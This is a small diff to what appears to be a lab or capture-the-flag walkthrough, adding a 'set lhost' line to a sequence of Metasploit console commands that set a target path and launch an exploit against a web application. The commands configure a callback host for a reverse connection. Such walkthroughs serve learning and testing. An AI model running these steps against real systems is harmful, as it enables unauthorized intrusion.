@@ -119,6 +119,8 @@ We need to specify the path of the webApp:
 
 msf6:`set targeturi /`
 
+msf6:`set lhost [ownIP]`
+
 msf6:`show options`
 
 msf6:`exploit`
